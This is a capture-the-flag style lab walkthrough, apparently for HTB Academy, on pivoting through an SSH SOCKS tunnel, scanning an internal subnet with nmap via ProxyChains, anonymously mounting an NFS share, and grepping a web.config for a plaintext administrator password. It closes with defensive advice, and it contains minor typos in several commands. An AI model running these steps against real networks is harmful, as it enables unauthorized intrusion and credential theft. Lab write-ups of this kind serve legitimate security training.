# 🛰️ Initial Reconnaissance

## 🌐 External Network Analysis

### 🔍 Subnet Discovery
```bash
# SSH pivot setup through existing machine (172.16.8.10)
ssh -i private_key root@172.16.8.10 -D 8081 # Set up dynamic port forwarding

# Bash ping sweep for potential hosts in the 172.16.8.0/24 network
ping -c 1 172.16.8.{1..254}
```

### 📊 Host Identification & Service Enumeration
```bash
# Port scanning through proxychains (from attack host)
proxychains nmap -sS 172.16.8.0/24 --min-rtt-timeout 1ms -T agressive

# Specific host enumeration
proxychains nmap -p- -sV -Pn -T aggressive 172.16.8.3 # Domain Controller
proxychains nmap -p- -sV -Pn -T aggressive 172.16.8.50 # Windows Server
proxychains nmap -p- -sV -Pn -T aggressive 172.16.8.20 # Web server

# Additional services and ports identified:
[!NOTE] The following services were found:
- FTP: 21/tcp, File Transfer Protocol (unencrypted)
- SMB: 445/tcp, Microsoft Windows file and print sharing
- HTTP: 80/tcp, HTTP Server (web interface for DNN installation page)
```

## 🚀 SSH Pivot Setup

### 🔍 Dynamic Port Forwarding
```bash
# Dynamic port forwarding setup on the pivot host
ssh -i private_key root@172.16.8.10 -D 8081 # Establish dynamic tunnel

# Verify SOCKS proxy is working correctly:
curl --socks5-hostname 127.0.0.1:8081 http://ifconfig.io/ip
```

### 🌐 ProxyChains Configuration
```bash
# Configure ProxyChains to use the established SSH tunnel
sudo nano /etc/proxychains.conf # Add 'socks4 127.0.0.1 8081' under [ProxyList]

# Validate proxy functionality:
proxychains nmap -p- -T aggressive 172.16.8.3 # Domain Controller
```

## 📊 Internal Network Reconnaissance

### 🔍 Host Discovery & Enumeration
```bash
# Host discovery through ProxyChains (from attack host)
proxychains nmap -sS 172.16.8.0/24 --min-rtt-timeout 1ms -T aggressive

# Specific service scanning:
[!SUCCESS] Identified key services and ports on internal network hosts
```

### 🔍 NFS Exploitation & Credential Discovery
```bash
# Mounting the NFS share from a pivot host
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01

# Analyzing the contents of the mounted NFS share:
cd /tmp/DEV01/
ls -la # List directory contents
```

### 🔍 DNN Configuration Analysis
```bash
# Extracting credentials from web.config file
cat /tmp/DEV01/DNN/web.config | grep -i username
cat /tmp/DEV01/DNN/web.config | grep -i password

[!SUCCESS] Credentials extracted:
- Username: Administrator
- Password: D0tn31Nuk3R0ck$$@123
```

## 📡 Network Traffic Analysis & Exploitation

### 🔍 Packet Capture Setup
```bash
# Capturing network traffic on pivot host
tcpdump -i ens192 -s 65535 -w ilfreight_pcap

# Transfer PCAP to attack host and analyze:
wireshark ilfreight_pcap # Load in Wireshark for analysis
```

### 🔍 Network Intelligence Gathering
```bash
# Collecting network configuration details on pivot host
ip route
cat /etc/resolv.conf
arp -a
ifconfig -a
netstat -antup
```

## 🎯 Attack Surface Assessment

### 🔴 High-Priority Targets
```cmd
- 172.16.8.20 (Windows Server):
  - DNN installation page accessible
  - NFS misconfiguration: anonymous access enabled
  
- 172.16.8.3 (Domain Controller):
  - Active Directory services present
  - Likely to be hardened against common attacks

- 172.16.8.50 (Windows Server):
  - Tomcat service with web applications
  - RDP and SMB access available
```

### 🟡 Secondary Targets
```cmd
- Additional reconnaissance:
  - Full TCP port scans for all hosts
  - UDP service discovery
  - SMB share enumeration (if authenticated)
  - Web application directory brute forcing
```

## 🛠️ Tools & Techniques Summary

### 🔍 Discovery Techniques
```bash
# Host and network services discovery through pivot:
- SSH dynamic port forwarding: ssh -i private_key user@target -D PORT
- ProxyChains configuration for Nmap scans from attack host
- NFS share mounting and analysis on pivot host
```

## 🎯 HTB Academy Lab

### 📋 Lab Solution Summary
```cmd
1. Set up SSH dynamic port forwarding (8081) to pivot into the internal network.
2. Configure ProxyChains for Nmap scanning through the SOCKS proxy.
3. Identify live hosts and open services using nmap.
4. Mount NFS share anonymously on pivot host and analyze content.
5. Retrieve credentials from web.config file in DNN directory.
6. Access `/DEV01/flag.txt` to obtain the flag.

# Key techniques demonstrated:
- Pivoting through SSH port forwarding
- Exploiting misconfigured NFS shares for credential discovery
```

### 🔍 Learning Objectives
```cmd
- Setting up SSH dynamic port forwarding.
- Configuring ProxyChains with SOCKS proxy integration.
- Conducting internal network reconnaissance using Nmap.
- Mounting and analyzing NFS shares to extract sensitive data.
- Mapping out the network topology systematically.
```

## 🛡️ Defensive Recommendations

### 🔒 Network Security
```cmd
# Secure network segmentation:
- Isolate DMZ properly from internal networks.
- Limit access between different network segments.

# Harden services exposed internally:
- Disable unnecessary NFS exports or restrict permissions.
- Regularly review and secure configuration files.

# Enhance monitoring capabilities:
- Implement traffic analysis to detect anomalies.
- Monitor and audit privileged accesses and file modifications regularly.
```

---